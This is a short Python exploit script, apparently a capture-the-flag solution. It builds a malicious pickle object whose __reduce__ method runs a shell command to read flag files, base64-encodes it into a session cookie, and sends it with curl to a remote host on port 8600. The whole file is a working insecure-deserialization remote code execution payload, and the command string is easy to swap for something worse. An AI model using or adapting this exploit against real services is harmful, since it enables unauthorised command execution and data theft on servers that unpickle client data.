import pickle
import base64
import os


command='cd /; cat flag*'

class Exp:
    def __reduce__(self):
        return (__import__('subprocess').getoutput,(command,))



cookie= base64.b64encode(pickle.dumps({"age":1, "name":Exp()})).decode()
os.system(f"curl http://h4ck3r.quest:8600/ --cookie 'session={cookie}'")
# os.system(f"curl http://h4ck3r.quest:8600/")